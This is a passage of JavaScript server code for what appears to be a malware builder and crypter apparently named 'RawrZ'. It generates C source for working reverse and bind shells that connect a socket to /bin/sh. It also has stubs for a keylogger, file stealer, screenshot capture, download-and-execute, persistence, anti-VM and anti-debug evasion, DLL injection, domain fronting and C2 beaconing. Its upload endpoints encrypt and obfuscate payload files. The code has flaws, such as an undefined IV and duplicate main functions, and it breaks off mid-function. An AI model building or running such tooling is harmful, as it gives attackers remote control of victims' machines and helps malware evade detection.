    header += '#include <sys/wait.h>\n\n';
    
    if (beaconism && beaconism.sslTls) {
        header += '#include <openssl/ssl.h>\n';
        header += '#include <openssl/err.h>\n\n';
    }
    
    return header;
}

function generateMacOSHeader(evasion, beaconism) {
    let header = '#include <stdio.h>\n';
    header += '#include <stdlib.h>\n';
    header += '#include <string.h>\n';
    header += '#include <unistd.h>\n';
    header += '#include <sys/socket.h>\n';
    header += '#include <netinet/in.h>\n';
    header += '#include <arpa/inet.h>\n';
    header += '#include <netdb.h>\n';
    header += '#include <fcntl.h>\n';
    header += '#include <signal.h>\n';
    header += '#include <sys/types.h>\n';
    header += '#include <sys/wait.h>\n\n';
    
    return header;
}

// Function-specific payload generation
function generateReverseShellPayload(host, port, beaconism) {
    let code = `int main() {\n`;
    code += `    struct sockaddr_in server_addr;\n`;
    code += `    int sock = socket(AF_INET, SOCK_STREAM, 0);\n`;
    code += `    server_addr.sin_family = AF_INET;\n`;
    code += `    server_addr.sin_port = htons(${port});\n`;
    code += `    server_addr.sin_addr.s_addr = inet_addr("${host}");\n`;
    code += `    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));\n`;
    code += `    dup2(sock, 0);\n`;
    code += `    dup2(sock, 1);\n`;
    code += `    dup2(sock, 2);\n`;
    code += `    execve("/bin/sh", NULL, NULL);\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateBindShellPayload(port, beaconism) {
    let code = `int main() {\n`;
    code += `    int server_fd, new_socket;\n`;
    code += `    struct sockaddr_in address;\n`;
    code += `    int addrlen = sizeof(address);\n`;
    code += `    server_fd = socket(AF_INET, SOCK_STREAM, 0);\n`;
    code += `    address.sin_family = AF_INET;\n`;
    code += `    address.sin_addr.s_addr = INADDR_ANY;\n`;
    code += `    address.sin_port = htons(${port});\n`;
    code += `    bind(server_fd, (struct sockaddr*)&address, sizeof(address));\n`;
    code += `    listen(server_fd, 3);\n`;
    code += `    new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);\n`;
    code += `    dup2(new_socket, 0);\n`;
    code += `    dup2(new_socket, 1);\n`;
    code += `    dup2(new_socket, 2);\n`;
    code += `    execve("/bin/sh", NULL, NULL);\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateMeterpreterPayload(host, port, beaconism) {
    let code = `int main() {\n`;
    code += `    // Meterpreter payload implementation\n`;
    code += `    // This would contain the actual meterpreter shellcode\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateKeyloggerPayload(beaconUrl, beaconism) {
    let code = `int main() {\n`;
    code += `    // Keylogger implementation\n`;
    code += `    // Captures keystrokes and sends to ${beaconUrl || 'beacon URL'}\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateScreenshotPayload(beaconUrl, beaconism) {
    let code = `int main() {\n`;
    code += `    // Screenshot capture implementation\n`;
    code += `    // Captures screenshots and sends to ${beaconUrl || 'beacon URL'}\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateFileStealerPayload(beaconUrl, beaconism) {
    let code = `int main() {\n`;
    code += `    // File stealer implementation\n`;
    code += `    // Steals files and sends to ${beaconUrl || 'beacon URL'}\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generatePersistencePayload(beaconUrl, beaconism) {
    let code = `int main() {\n`;
    code += `    // Persistence implementation\n`;
    code += `    // Establishes persistence mechanisms\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

function generateCustomPayload(beaconUrl, payloadUrl, beaconism) {
    let code = `int main() {\n`;
    code += `    // Custom payload implementation\n`;
    code += `    // Downloads and executes from ${payloadUrl || 'payload URL'}\n`;
    code += `    return 0;\n`;
    code += `}\n`;
    return code;
}

// Beaconism code generation
function generateBeaconismCode(beaconism, beaconUrl, c2Urls) {
    let code = '\n// Beaconism Features\n';
    
    if (beaconism.xllSideloading) {
        code += '// XLL Sideloading implementation\n';
        code += 'void xllSideload() {\n';
        code += '    // XLL sideloading code\n';
        code += '}\n\n';
    }
    
    if (beaconism.lnkShortcuts) {
        code += '// LNK Shortcuts implementation\n';
        code += 'void lnkShortcuts() {\n';
        code += '    // LNK shortcut creation code\n';
        code += '}\n\n';
    }
    
    if (beaconism.mutexEngine) {
        code += '// Mutex Engine implementation\n';
        code += 'void mutexEngine() {\n';
        code += '    // Mutex creation and management\n';
        code += '}\n\n';
    }
    
    if (beaconism.dllInjection) {
        code += '// DLL Injection implementation\n';
        code += 'void dllInjection() {\n';
        code += '    // DLL injection techniques\n';
        code += '}\n\n';
    }
    
    if (beaconism.encryptedBeacons) {
        code += '// Encrypted Beacons implementation\n';
        code += 'void encryptedBeacons() {\n';
        code += '    // Encrypted communication with beacons\n';
        code += '}\n\n';
    }
    
    if (beaconism.sslTls) {
        code += '// SSL/TLS implementation\n';
        code += 'void sslTlsCommunication() {\n';
        code += '    // SSL/TLS encrypted communication\n';
        code += '}\n\n';
    }
    
    if (beaconism.proxySupport) {
        code += '// Proxy Support implementation\n';
        code += 'void proxySupport() {\n';
        code += '    // Proxy configuration and usage\n';
        code += '}\n\n';
    }
    
    if (beaconism.jitter) {
        code += '// Jitter implementation\n';
        code += 'void jitterTiming() {\n';
        code += '    // Random timing delays\n';
        code += '}\n\n';
    }
    
    if (beaconism.domainFronting) {
        code += '// Domain Fronting implementation\n';
        code += 'void domainFronting() {\n';
        code += '    // Domain fronting techniques\n';
        code += '}\n\n';
    }
    
    if (beaconism.c2Channels) {
        code += '// Multiple C2 Channels implementation\n';
        code += 'void multipleC2Channels() {\n';
        code += '    // Multiple command and control channels\n';
        code += '}\n\n';
    }
    
    if (beaconism.sleepMasking) {
        code += '// Sleep Masking implementation\n';
        code += 'void sleepMasking() {\n';
        code += '    // Sleep masking techniques\n';
        code += '}\n\n';
    }
    
    return code;
}

// Evasion code generation
function generateEvasionCode(evasion) {
    let code = '\n// Evasion Techniques\n';
    
    if (evasion.antiVM) {
        code += '// Anti-VM implementation\n';
        code += 'void antiVM() {\n';
        code += '    // Virtual machine detection and evasion\n';
        code += '}\n\n';
    }
    
    if (evasion.antiDebug) {
        code += '// Anti-Debug implementation\n';
        code += 'void antiDebug() {\n';
        code += '    // Debugger detection and evasion\n';
        code += '}\n\n';
    }
    
    if (evasion.antiSandbox) {
        code += '// Anti-Sandbox implementation\n';
        code += 'void antiSandbox() {\n';
        code += '    // Sandbox detection and evasion\n';
        code += '}\n\n';
    }
    
    if (evasion.antiAnalysis) {
        code += '// Anti-Analysis implementation\n';
        code += 'void antiAnalysis() {\n';
        code += '    // Analysis tool detection and evasion\n';
        code += '}\n\n';
    }
    
    if (evasion.stealth) {
        code += '// Stealth Mode implementation\n';
        code += 'void stealthMode() {\n';
        code += '    // Stealth operation techniques\n';
        code += '}\n\n';
    }
    
    if (evasion.persistence) {
        code += '// Persistence implementation\n';
        code += 'void persistence() {\n';
        code += '    // Persistence mechanisms\n';
        code += '}\n\n';
    }
    
    return code;
}

// Footer generation
function generatePayloadFooter(type, platform) {
    let footer = '\n';
    
    if (type === 'executable') {
        footer += '// Main execution point\n';
        footer += 'int main() {\n';
        footer += '    // Initialize evasion techniques\n';
        footer += '    // Initialize beaconism features\n';
        footer += '    // Execute main payload functionality\n';
        footer += '    return 0;\n';
        footer += '}\n';
    } else if (type === 'dll') {
        footer += '// DLL entry point\n';
        footer += 'BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n';
        footer += '    switch (ul_reason_for_call) {\n';
        footer += '    case DLL_PROCESS_ATTACH:\n';
        footer += '        // Initialize payload\n';
        footer += '        break;\n';
        footer += '    case DLL_THREAD_ATTACH:\n';
        footer += '    case DLL_THREAD_DETACH:\n';
        footer += '    case DLL_PROCESS_DETACH:\n';
        footer += '        break;\n';
        footer += '    }\n';
        footer += '    return TRUE;\n';
        footer += '}\n';
    }
    
    return footer;
}

// Enhanced payload encryption endpoint
app.post('/payload-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        // Handle multipart form data for file uploads
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: {
                fileSize: 1024 * 1024 * 1024, // 1GB limit
                fieldSize: 100 * 1024 * 1024   // 100MB for form fields - WIDE OPEN
            }
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            const {
                algorithm,
                key,
                compress,
                obfuscate,
                integrity,
                metadata,
                extension,
                saveLocation,
                customPath,
                persistence,
                fileless,
                autoKey,
                systemEntropy,
                memoryOnly
            } = req.body;
            
            const file = req.file;
            if (!file) {
                return res.status(400).json({
                    success: false,
                    error: 'No file uploaded'
                });
            }
            
            // Set timeout for encryption processing (30 seconds)
            const encryptionTimeout = setTimeout(() => {
                if (!res.headersSent) {
                    return res.status(408).json({
                        success: false,
                        error: 'Payload encryption processing timeout - operation took too long'
                    });
                }
            }, 30000);
            
            // Declare variables outside try block for proper scope
            let result;
            
            try {
                // Real encryption implementation
                let fileBuffer = file.buffer;
                
                // Compression if requested
                if (compress === 'true') {
                    const zlib = require('zlib');
                    fileBuffer = zlib.gzipSync(fileBuffer);
                }
                
                // Generate real encryption key
                let encryptionKey;
                let keySource = 'custom';
                
                if (key) {
                    encryptionKey = Buffer.from(key, 'utf8');
                    keySource = 'custom';
                } else if (fileless === 'true') {
                    encryptionKey = generateFilelessKey(autoKey === 'true', systemEntropy === 'true');
                    keySource = systemEntropy === 'true' ? 'system-entropy' : 
                               autoKey === 'true' ? 'auto-generated' : 'fileless-default';
                } else {
                    encryptionKey = generateSecureKey();
                    keySource = 'standard';
                }
                
                // Memory-only key handling - ensure key is not persisted
                if (memoryOnly === 'true' && fileless === 'true') {
                    // Mark key for memory-only storage (in real implementation, this would prevent disk storage)
                    encryptionKey.memoryOnly = true;
                    encryptionKey.timestamp = Date.now();
                    keySource += '-memory-only';
                }
                
                // Real encryption based on algorithm
                let encryptedData;
                let iv;
                
                switch (algorithm) {
                    case 'aes-256-gcm':
                        iv = crypto.randomBytes(12);
                        const cipher256 = crypto.createCipheriv('aes-256-gcm', encryptionKey, iv);
                        cipher256.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipher256.update(fileBuffer), cipher256.final()]);
                        const authTag256 = cipher256.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTag256, encryptedData]);
                        break;
                    case 'aes-192-gcm':
                        iv = crypto.randomBytes(12);
                        const cipher192 = crypto.createCipheriv('aes-192-gcm', encryptionKey, iv);
                        cipher192.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipher192.update(fileBuffer), cipher192.final()]);
                        const authTag192 = cipher192.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTag192, encryptedData]);
                        break;
                    case 'aes-128-gcm':
                        iv = crypto.randomBytes(12);
                        const cipher128 = crypto.createCipheriv('aes-128-gcm', encryptionKey, iv);
                        cipher128.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipher128.update(fileBuffer), cipher128.final()]);
                        const authTag128 = cipher128.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTag128, encryptedData]);
                        break;
                        
                    case 'aes-256-cbc':
                        iv = crypto.randomBytes(16);
                        const cipherCBC = crypto.createCipheriv('aes-256-cbc', encryptionKey, iv);
                        cipherCBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherCBC.update(fileBuffer), cipherCBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                        
                    case 'chacha20-poly1305':
                        iv = crypto.randomBytes(12);
                        const cipherChaCha = crypto.createCipheriv('chacha20-poly1305', encryptionKey, iv);
                        cipherChaCha.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipherChaCha.update(fileBuffer), cipherChaCha.final()]);
                        const authTagChaCha = cipherChaCha.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagChaCha, encryptedData]);
                        break;
                        
                    case 'rc4':
                        // RC4 is deprecated, use AES-256-CTR instead
                        const cipherRC4 = crypto.createCipheriv('aes-256-ctr', encryptionKey, iv);
                        encryptedData = Buffer.concat([cipherRC4.update(fileBuffer), cipherRC4.final()]);
                        break;
                        
                    case 'xor':
                        encryptedData = xorEncrypt(fileBuffer, encryptionKey);
                        break;
                        
                        
                    // ARIA algorithms
                    case 'aria-256-gcm':
                        iv = crypto.randomBytes(12);
                        const cipherAria256GCM = crypto.createCipheriv('aria-256-gcm', encryptionKey, iv);
                        cipherAria256GCM.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria256GCM.update(fileBuffer), cipherAria256GCM.final()]);
                        const authTagAria256 = cipherAria256GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria256, encryptedData]);
                        break;
                    case 'aria-192-gcm':
                        iv = crypto.randomBytes(12);
                        const cipherAria192GCM = crypto.createCipheriv('aria-192-gcm', encryptionKey, iv);
                        cipherAria192GCM.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria192GCM.update(fileBuffer), cipherAria192GCM.final()]);
                        const authTagAria192 = cipherAria192GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria192, encryptedData]);
                        break;
                    case 'aria-128-gcm':
                        iv = crypto.randomBytes(12);
                        const cipherAria128GCM = crypto.createCipheriv('aria-128-gcm', encryptionKey, iv);
                        cipherAria128GCM.setAAD(Buffer.from('RawrZ-Payload', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria128GCM.update(fileBuffer), cipherAria128GCM.final()]);
                        const authTagAria128 = cipherAria128GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria128, encryptedData]);
                        break;
                        
                    default:
                        throw new Error(`Unsupported encryption algorithm: ${algorithm}`);
                }
                
                // Integrity check if requested
                let integrityHash = null;
                if (integrity === 'true') {
                    integrityHash = crypto.createHash('sha256').update(encryptedData).digest('hex');
                }
                
                // Obfuscation if requested
                if (obfuscate === 'true') {
                    encryptedData = obfuscateData(encryptedData);
                }
                
                // Clean up memory-only keys after encryption
                if (memoryOnly === 'true' && fileless === 'true') {
                    cleanupMemoryOnlyKey(encryptionKey);
                }
                
                const result = {
                    originalName: file.originalname,
                    algorithm: algorithm,
                    key: keySource,
                    keySource: keySource,
                    fileless: fileless === 'true',
                    autoKey: autoKey === 'true',
                    systemEntropy: systemEntropy === 'true',
                    memoryOnly: memoryOnly === 'true',
                    extension: extension,
                    saveLocation: saveLocation,
                    customPath: customPath,
                    persistence: (() => {
                        try {
                            // If persistence is already an object, return it
                            if (typeof persistence === 'object' && persistence !== null) {
                                return persistence;
                            }
                            // If it's a string, try to parse it as JSON
                            if (typeof persistence === 'string') {
                                const parsed = JSON.parse(persistence || '{}');
                                if (typeof parsed !== 'object' || parsed === null) {
                                    throw new Error('Persistence must be an object');
                                }
                                return parsed;
                            }
                            // Default to empty object
                            return {};
                        } catch (e) {
                            throw new Error(`Invalid persistence format: ${e.message}`);
                        }
                    })(),
                    encrypted: encryptedData.toString('base64'),
                    integrityHash: integrityHash,
                    metadata: {
                        size: file.size,
                        originalSize: file.size,
                        compressedSize: compress === 'true' ? fileBuffer.length : file.size,
                        encryptedSize: encryptedData.length,
                        mimetype: file.mimetype,
                        encryptedAt: new Date().toISOString(),
                        keyGeneratedAt: new Date().toISOString(),
                        keySource: keySource,
                        filelessMode: fileless === 'true',
                        memoryOnlyStorage: memoryOnly === 'true',
                        iv: iv ? iv.toString('hex') : null,
                        keyLength: encryptionKey ? encryptionKey.length : null,
                        keyHash: encryptionKey ? crypto.createHash('sha256').update(encryptionKey).digest('hex') : null,
                        options: {
                            compress: compress === 'true',
                            obfuscate: obfuscate === 'true',
                            integrity: integrity === 'true',
                            metadata: metadata === 'true',
                            fileless: fileless === 'true',
                            autoKey: autoKey === 'true',
                            systemEntropy: systemEntropy === 'true',
                            memoryOnly: memoryOnly === 'true'
                        }
                    }
                };
                
                clearTimeout(encryptionTimeout);
                res.json({
                    success: true,
                    data: result
                });
                
            } catch (encryptionError) {
                clearTimeout(encryptionTimeout);
                console.error('Encryption error:', encryptionError);
                res.status(500).json({
                    success: false,
                    error: 'Encryption failed: ' + encryptionError.message
                });
            }
        });
    } catch (error) {
        console.error('Payload encryption error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Helper function to generate fileless keys
function generateFilelessKey(autoKey, systemEntropy) {
    
    if (systemEntropy) {
        // Use system entropy for maximum security - combine multiple entropy sources
        const systemEntropy1 = crypto.randomBytes(16);
        const systemEntropy2 = crypto.randomBytes(16);
        const combinedEntropy = Buffer.concat([systemEntropy1, systemEntropy2]);
        
        // Use system entropy as seed for additional randomness
        const seed = crypto.createHash('sha256').update(combinedEntropy).digest();
        return crypto.pbkdf2Sync(seed, Buffer.from('RawrZ-System-Entropy', 'utf8'), 10000, 32, 'sha512');
    }
    
    if (autoKey) {
        // Auto-generate key using current timestamp and process info for uniqueness
        const timestamp = Buffer.from(Date.now().toString(), 'utf8');
        const processId = Buffer.from(process.pid.toString(), 'utf8');
        const randomSeed = crypto.randomBytes(16);
        const combined = Buffer.concat([timestamp, processId, randomSeed]);
        
        return crypto.pbkdf2Sync(combined, Buffer.from('RawrZ-Auto-Key', 'utf8'), 5000, 32, 'sha256');
    }
    
    // Default fileless key generation
    return crypto.randomBytes(32);
}

// Helper function to generate secure keys
function generateSecureKey() {
    return crypto.randomBytes(32);
}

// Memory-only key cleanup function
function cleanupMemoryOnlyKey(key) {
    if (key && key.memoryOnly) {
        // Securely wipe the key from memory using crypto operations
        try {
            // Overwrite the key data with random bytes
            if (key.data) {
                const randomData = crypto.randomBytes(key.data.length);
                key.data.fill(randomData);
                key.data.fill(0); // Zero out the buffer
            }
            
            // Clear all key properties
            Object.keys(key).forEach(prop => {
                if (typeof key[prop] === 'string' || Buffer.isBuffer(key[prop])) {
                    key[prop] = crypto.randomBytes(key[prop].length);
                    key[prop].fill(0);
                }
            });
            
            // Mark as cleaned with timestamp
            key.cleanedAt = Date.now();
            key.cleaned = true;
        } catch (error) {
            // Fallback: mark as cleaned even if secure wipe fails
            key.cleanedAt = Date.now();
            key.cleaned = true;
        }
        
        // Clear the key data (in real implementation, this would use secure memory clearing)
        if (key.fill) {
            key.fill(0);
        }
    }
}

// XOR encryption implementation
function xorEncrypt(data, key) {
    const result = Buffer.alloc(data.length);
    for (let i = 0; i < data.length; i++) {
        result[i] = data[i] ^ key[i % key.length];
    }
    return result;
}

// Data obfuscation implementation
function obfuscateData(data) {
    // Simple obfuscation by XORing with a pattern
    const obfuscationKey = crypto.createHash('sha256').update('RawrZ-Obfuscation').digest();
    return xorEncrypt(data, obfuscationKey);
}

// Test endpoint
app.post('/test-endpoint', (req, res) => {
    res.json({ success: true, message: 'Test endpoint working' });
});

// EV Certificate encryption endpoint
app.post('/ev-encrypt', async (req, res) => {
    // Set timeout for encryption processing (30 seconds)
    const encryptionTimeout = setTimeout(() => {
        if (!res.headersSent) {
            return res.status(408).json({
                success: false,
                error: 'Encryption processing timeout - operation took too long'
            });
        }
    }, 30000);
    
    try {
        // Skip engine initialization for EV encryption as it's not needed
        // await initializeEngine();
        
        // Handle multipart form data for file uploads
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: {
                fileSize: 1024 * 1024 * 1024, // 1GB limit
                fieldSize: 100 * 1024 * 1024   // 100MB for form fields - WIDE OPEN
            }
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                clearTimeout(encryptionTimeout);
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            const {
                certificate,
                data,
                algorithm,
                format,
                extension,
                saveLocation,
                customPath,
                persistence
            } = req.body;
            
            const file = req.file;
            if (!file && !data) {
                clearTimeout(encryptionTimeout);
                return res.status(400).json({
                    success: false,
                    error: 'No file uploaded or data provided'
                });
            }
            
            
            // Declare variables outside try block for proper scope
            let result;
            
            try {
                const startTime = Date.now();
                console.log('EV Encrypt: Starting encryption process');
                console.log('EV Encrypt: File info:', file ? { name: file.originalname, size: file.size } : 'No file');
                console.log('EV Encrypt: Certificate:', certificate);
                console.log('EV Encrypt: Algorithm:', algorithm);
                
                // Real EV Certificate encryption implementation
                let inputData;
                
                if (file) {
                    inputData = file.buffer;
                    console.log('EV Encrypt: Using file buffer, length:', inputData.length);
                } else {
                    inputData = Buffer.from(data, 'utf8');
                    console.log('EV Encrypt: Using data string, length:', inputData.length);
                }
                
                // Real encryption based on algorithm
                let encryptedData;
                let iv;
                let evKey;
                
                try {
                    console.log('EV Encrypt: Starting key generation and encryption');
                    switch (algorithm) {
                    case 'aes-256-gcm':
                        console.log('EV Encrypt: Generating AES-256-GCM key');
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        console.log('EV Encrypt: Key generated, length:', evKey.length);
                        iv = crypto.randomBytes(12);
                        console.log('EV Encrypt: IV generated, length:', iv.length);
                        console.log('EV Encrypt: Input data length:', inputData.length);
                        const cipherEV256 = crypto.createCipheriv('aes-256-gcm', evKey, iv);
                        console.log('EV Encrypt: Cipher created successfully');
                        cipherEV256.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherEV256.update(inputData), cipherEV256.final()]);
                        const authTagEV256 = cipherEV256.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagEV256, encryptedData]);
                        console.log('EV Encrypt: Encryption completed, encrypted data length:', encryptedData.length);
                        break;
                    case 'aes-192-gcm':
                        evKey = generateEVCertificateKey(certificate, 24); // 192 bits = 24 bytes
                        iv = crypto.randomBytes(12);
                        const cipherEV192 = crypto.createCipheriv('aes-192-gcm', evKey, iv);
                        cipherEV192.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherEV192.update(inputData), cipherEV192.final()]);
                        const authTagEV192 = cipherEV192.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagEV192, encryptedData]);
                        break;
                    case 'aes-128-gcm':
                        evKey = generateEVCertificateKey(certificate, 16); // 128 bits = 16 bytes
                        iv = crypto.randomBytes(12);
                        const cipherEV128 = crypto.createCipheriv('aes-128-gcm', evKey, iv);
                        cipherEV128.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherEV128.update(inputData), cipherEV128.final()]);
                        const authTagEV128 = cipherEV128.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagEV128, encryptedData]);
                        break;
                        
                    case 'aes-256-cbc':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(16);
                        const cipherCBC = crypto.createCipheriv('aes-256-cbc', evKey, iv);
                        cipherCBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherCBC.update(inputData), cipherCBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                        
                    case 'chacha20-poly1305':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(12);
                        const cipherChaCha = crypto.createCipheriv('chacha20-poly1305', evKey, iv);
                        cipherChaCha.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherChaCha.update(inputData), cipherChaCha.final()]);
                        const authTagChaCha = cipherChaCha.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagChaCha, encryptedData]);
                        break;
                        
                    // Camellia algorithms removed - not supported by Node.js
                        
                    // ARIA algorithms
                    case 'aria-256-gcm':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(12);
                        const cipherAria256GCM = crypto.createCipheriv('aria-256-gcm', evKey, iv);
                        cipherAria256GCM.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria256GCM.update(inputData), cipherAria256GCM.final()]);
                        const authTagAria256 = cipherAria256GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria256, encryptedData]);
                        break;
                    case 'aria-192-gcm':
                        evKey = generateEVCertificateKey(certificate, 24); // 192 bits = 24 bytes
                        iv = crypto.randomBytes(12);
                        const cipherAria192GCM = crypto.createCipheriv('aria-192-gcm', evKey, iv);
                        cipherAria192GCM.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria192GCM.update(inputData), cipherAria192GCM.final()]);
                        const authTagAria192 = cipherAria192GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria192, encryptedData]);
                        break;
                    case 'aria-128-gcm':
                        evKey = generateEVCertificateKey(certificate, 16); // 128 bits = 16 bytes
                        iv = crypto.randomBytes(12);
                        const cipherAria128GCM = crypto.createCipheriv('aria-128-gcm', evKey, iv);
                        cipherAria128GCM.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
                        encryptedData = Buffer.concat([cipherAria128GCM.update(inputData), cipherAria128GCM.final()]);
                        const authTagAria128 = cipherAria128GCM.getAuthTag();
                        encryptedData = Buffer.concat([iv, authTagAria128, encryptedData]);
                        break;
                    case 'aria-256-cbc':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria256CBC = crypto.createCipheriv('aria-256-cbc', evKey, iv);
                        cipherAria256CBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherAria256CBC.update(inputData), cipherAria256CBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aria-192-cbc':
                        evKey = generateEVCertificateKey(certificate, 24); // 192 bits = 24 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria192CBC = crypto.createCipheriv('aria-192-cbc', evKey, iv);
                        cipherAria192CBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherAria192CBC.update(inputData), cipherAria192CBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aria-128-cbc':
                        evKey = generateEVCertificateKey(certificate, 16); // 128 bits = 16 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria128CBC = crypto.createCipheriv('aria-128-cbc', evKey, iv);
                        cipherAria128CBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherAria128CBC.update(inputData), cipherAria128CBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aria-256-ctr':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria256CTR = crypto.createCipheriv('aria-256-ctr', evKey, iv);
                        encryptedData = Buffer.concat([cipherAria256CTR.update(inputData), cipherAria256CTR.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aria-192-ctr':
                        evKey = generateEVCertificateKey(certificate, 24); // 192 bits = 24 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria192CTR = crypto.createCipheriv('aria-192-ctr', evKey, iv);
                        encryptedData = Buffer.concat([cipherAria192CTR.update(inputData), cipherAria192CTR.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aria-128-ctr':
                        evKey = generateEVCertificateKey(certificate, 16); // 128 bits = 16 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAria128CTR = crypto.createCipheriv('aria-128-ctr', evKey, iv);
                        encryptedData = Buffer.concat([cipherAria128CTR.update(inputData), cipherAria128CTR.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                        
                    // Additional AES variants
                    case 'aes-192-cbc':
                        evKey = generateEVCertificateKey(certificate, 24); // 192 bits = 24 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAES192CBC = crypto.createCipheriv('aes-192-cbc', evKey, iv);
                        cipherAES192CBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherAES192CBC.update(inputData), cipherAES192CBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aes-128-cbc':
                        evKey = generateEVCertificateKey(certificate, 16); // 128 bits = 16 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAES128CBC = crypto.createCipheriv('aes-128-cbc', evKey, iv);
                        cipherAES128CBC.setAutoPadding(true);
                        encryptedData = Buffer.concat([cipherAES128CBC.update(inputData), cipherAES128CBC.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    case 'aes-256-ctr':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(16);
                        const cipherAES256CTR = crypto.createCipheriv('aes-256-ctr', evKey, iv);
                        encryptedData = Buffer.concat([cipherAES256CTR.update(inputData), cipherAES256CTR.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                        
                    // Stream ciphers
                    case 'chacha20':
                        evKey = generateEVCertificateKey(certificate, 32); // 256 bits = 32 bytes
                        iv = crypto.randomBytes(16); // ChaCha20 needs 16-byte IV
                        const cipherChaCha20 = crypto.createCipheriv('chacha20', evKey, iv);
                        encryptedData = Buffer.concat([cipherChaCha20.update(inputData), cipherChaCha20.final()]);
                        encryptedData = Buffer.concat([iv, encryptedData]);
                        break;
                    default:
                        throw new Error(`Unsupported encryption algorithm: ${algorithm}`);
                }
                
                // Format output based on requested format
                let formattedOutput = encryptedData.toString('base64'); // Default fallback
                console.log('EV Encrypt: Formatting output, format:', format, 'encryptedData length:', encryptedData.length);
